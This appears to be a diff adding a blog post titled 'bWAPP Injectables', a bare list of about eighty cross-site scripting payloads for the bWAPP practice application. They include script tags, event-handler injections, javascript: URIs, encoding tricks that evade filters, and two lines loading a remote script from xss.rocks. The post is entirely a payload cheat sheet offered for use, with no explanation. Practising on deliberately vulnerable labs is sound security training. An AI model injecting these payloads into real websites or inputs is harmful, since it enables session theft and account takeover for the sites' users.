@@ -1,0 +1,109 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2>
+<b>bWAPP Injectables</b></h2>
+<br />
+&lt;script&gt;alert(1)&lt;/script&gt;<br />
+&lt;script&gt;alert('1')&lt;/script&gt;<br />
+&lt;script&gt;alert(`1`)&lt;/script&gt; <br />
+&lt;script&gt;alert("1")&lt;/script&gt;<br />
+&lt;img src =x onerror=prompt[1]&gt;<br />
+&lt;img src =x onerror=prompt['1']&gt;<br />
+&lt;img src =x onerror=prompt["1"]&gt;<br />
+&lt;img src =x onerror=prompt[`1`]&gt;<br />
+&lt;img src =x onerror=prompt(1)&gt;<br />
+&lt;img src =x onerror=prompt('1')&gt;<br />
+&lt;img src =x onerror=prompt("1")&gt;<br />
+&lt;img src =x onerror=prompt(`1`)&gt;<br />
+&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;<br />
+&lt;IMG SRC="javascript:alert('XSS');"&gt;<br />
+&lt;IMG SRC=javascript:alert('XSS')&gt;<br />
+&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;<br />
+&lt;IMG SRC=javascript:alert("XSS")&gt;<br />
+&lt;IMG SRC=`javascript:alert("TEST, 'XSS'")`&gt;<br />
+&lt;IMG SRC="javascript:alert('XSS');"&gt;<br />
+&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;<br />
+&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"&gt;<br />
+&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"&gt;<br />
+&lt;IMG SRC=" &amp;#14;&nbsp; javascript:alert('XSS');"&gt;<br />
+&lt;SCRIPT/XSS SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;<br />
+&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;<br />
+&lt;SCRIPT/SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;<br />
+&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;<br />
+&lt;IMG SRC="javascript:alert('XSS')"<br />
+&nbsp;&lt;/script&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;<br />
+&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;<br />
+&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;<br />
+&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;<br />
+&lt;IMG DYNSRC="javascript:alert('XSS')"&gt;<br />
+&lt;IMG LOWSRC="javascript:alert('XSS')"&gt;<br />
+&lt;STYLE&gt;li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;<br />
+&lt;IMG SRC='vbscript:msgbox("XSS")'&gt;<br />
+&lt;IMG SRC="livescript:[code]"&gt;<br />
+&lt;svg/onload=alert('XSS')&gt;<br />
+&lt;svg/onload=alert('XSS')&gt;<br />
+&lt;BODY ONLOAD=alert('XSS')&gt;<br />
+&lt;BR SIZE="&amp;{alert('XSS')}"&gt;<br />
+&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;<br />
+&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"&gt;<br />
+&lt;STYLE&gt;.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;<br />
+&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;<br />
+&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert('XSS');"&gt;&lt;/FRAMESET&gt;<br />
+&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;<br />
+&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:alert('XSS')"&gt;<br />
+&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;<br />
+&nbsp;&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"&gt;<br />
+<br />
+"&gt;&lt;h1&gt;&lt;script&gt;alert("MESSAGE")&lt;/script&gt;123&lt;/h1&gt;<br />
+"&gt;&lt;/iframe&gt;&lt;script&gt;alert(`TEXT YOU WANT TO BE DISPLAYED`);&lt;/script&gt;<br />
+"&gt;&lt;h1&gt;&lt;IMG SRC="javascript:alert('XSS');"&gt;&lt;/h1&gt;<br />
+"&gt;&lt;h1&gt;&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;&lt;/h1&gt;<br />
+"&gt;&lt;h1&gt;&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;"&gt;123&lt;/h1&gt;<br />
+"&gt;&lt;h1&gt;&lt;STYLE&gt;.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;"&gt;&lt;/h1&gt;<br />
+<br />
+&lt;body onload=alert('test1')&gt;<br />
+&lt;IMG SRC=j&amp;#X41vascript:alert('test2')&gt;<br />
+&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;<br />
+<br />
+<span style="background-color: white; font-family: monospace; font-size: 13px; white-space: pre-line;">&lt;form id="test"&gt;&lt;/form&gt;&lt;button form="test" formaction="javascript:alert(1)"&gt;X&lt;/button&gt;</span><br />
+<span style="background-color: white; font-family: monospace; font-size: 13px; white-space: pre-line;">&lt;video poster=javascript:alert(1)//&gt;&lt;/video&gt;</span><br />
+<span style="background-color: white; font-family: monospace; font-size: 13px; white-space: pre-line;">&lt;form id=test onforminput=alert(1)&gt;&lt;input&gt;&lt;/form&gt;&lt;button form=test onformchange=alert(2)&gt;X&lt;/button&gt;</span><br />
+<span style="background-color: white; font-family: monospace; font-size: 13px; white-space: pre-line;">&lt;video&gt;&lt;source onerror="alert(1)"&gt;</span><br />
+<span style="background-color: white; font-family: monospace; font-size: 13px; white-space: pre-line;">&lt;video onerror="alert(1)"&gt;&lt;source&gt;&lt;/source&gt;&lt;/video&gt;</span><br />
+<span style="background-color: white; font-family: monospace; font-size: 13px; white-space: pre-line;">&lt;form&gt;&lt;button formaction="javascript:alert(1)"&gt;X&lt;/button&gt;</span><br />
+<span style="background-color: white; font-family: monospace; font-size: 13px; white-space: pre-line;">&lt;body oninput=alert(1)&gt;&lt;input autofocus&gt;</span><br />
+<span style="background-color: white; font-family: monospace; font-size: 13px; white-space: pre-line;">&lt;iframe srcdoc="&amp;lt;img src&amp;equals;x:x onerror&amp;equals;alert&amp;lpar;1&amp;rpar;&amp;gt;" /&gt;</span><br />
+<span style="background-color: white; font-family: monospace; font-size: 13px; white-space: pre-line;">&lt;picture&gt;&lt;source srcset="x"&gt;&lt;img onerror="alert(1)"&gt;&lt;/picture&gt;</span><br />
+<span style="background-color: white; font-family: monospace; font-size: 13px; white-space: pre-line;">&lt;picture&gt;&lt;img srcset="x" onerror="alert(1)"&gt;&lt;/picture&gt;</span><br />
+<span style="background-color: white; font-family: monospace; font-size: 13px; white-space: pre-line;">&lt;img srcset=",,,,,x" onerror="alert(1)"&gt;</span><br />
+<span style="background-color: white; font-family: monospace; font-size: 13px; white-space: pre-line;">&lt;details open ontoggle="alert(1)"&gt;</span><br />
+<span style="background-color: white; font-family: monospace; font-size: 13px; white-space: pre-line;">&lt;video src onratechange="alert(1)"&gt;</span><br />
+<span style="background-color: white; font-family: monospace; font-size: 13px; white-space: pre-line;">&lt;frameset onload=alert(1)&gt;</span><br />
+<span style="background-color: white; font-family: monospace; font-size: 13px; white-space: pre-line;"><br /></span>
+</div>
+<div style='clear: both;'></div>
+</div>
+<div class='post-footer'>
+<div class='post-footer-line post-footer-line-1'>
+<span class='post-author vcard'>
+</span>
+<span class='post-timestamp'>
+</span>
+<span class='reaction-buttons'>
+</span>
+<span class='post-comment-link'>
+</span>
+<span class='post-backlinks post-comment-link'>
+</span>
